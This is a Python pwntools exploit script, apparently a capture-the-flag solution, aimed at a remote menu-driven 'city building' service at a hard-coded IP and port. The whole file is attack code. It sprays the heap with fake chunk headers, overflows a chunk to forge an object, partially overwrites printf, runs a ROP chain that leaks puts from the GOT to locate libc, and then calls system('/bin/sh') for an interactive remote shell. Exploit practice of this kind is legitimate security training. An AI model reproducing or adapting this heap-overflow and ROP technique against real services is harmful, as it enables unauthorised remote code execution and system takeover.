#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.28"
#port = 8888
host = "54.169.198.139"
port = 2305

r = remote(host,port)

def develop(i,j,choice,content,app= None):
    r.recvuntil(">")
    cmd = "develop " + str(i) + " " + str(j) + " " + choice 
    if app :
        r.sendline(cmd.ljust(0x20) + app)
    else :
        r.sendline(cmd)
    if choice == "commercial" :
        r.recvuntil("?")
        r.sendline(content)
    elif choice == "residential" :
        r.recvuntil("?")
        r.sendline(str(content))
    else :
        return

def step():
    r.recvuntil(">")
    r.sendline("step")

def demolish(i,j):
    r.recvuntil(">")
    r.sendline("demolish " + str(i) + " " + str(j) + " ")

chunk = p64(0) + p64(0x21) #header
chunk += p64(0) + p64(0x21) #content
chunk += p64(0) + p64(0x21) #next header


chunk2 = p32(0xffffffd6) + p32(0) + p64(0x21)
chunk2 += p32(0xffffffd6) + p32(0) + p64(0x21)
chunk2 += p32(0xffffffd6) + p32(0) + p64(0x21)

develop(0,0,"residential",22,chunk*30)
develop(0,0,"commercial","ddaa",chunk*30)
step()
develop(0,1,"industrial","",chunk*200) # heap spray to create overlap chunk
demolish(0,1)
demolish(0,0)
develop(0,1,"commercial","welfare")
r.recvuntil(">")
r.sendline(chunk2*0x150) # overflow the chunk to create a fake a commercial object
r.recvuntil("command")
step()  # partial overwrite the printf to add rsp + 0xd8 
poprdi = 0x4019f3
poprbp = 0x400bb5
putplt = 0x400a10
putgot = 0x603030
read = 0x401171
putchargot = 0x603020
rop = p64(poprdi)
rop += p64(putgot)
rop += p64(putplt)
rop += p64(poprbp)
rop += p64(putchargot+0x110)
rop += p64(read)

develop(0,0,"commercial","a"*144 + rop) # triger rop
r.recvuntil("\n")
data = r.recvuntil("\n").strip()
puts = u64(data.ljust(8,"\x00"))
libc = puts - 0x00000000006f5d0
print "libc:",hex(libc)

system = libc + 0x45380
r.sendline("/bin/sh\x00" + p64(system))
r.interactive()
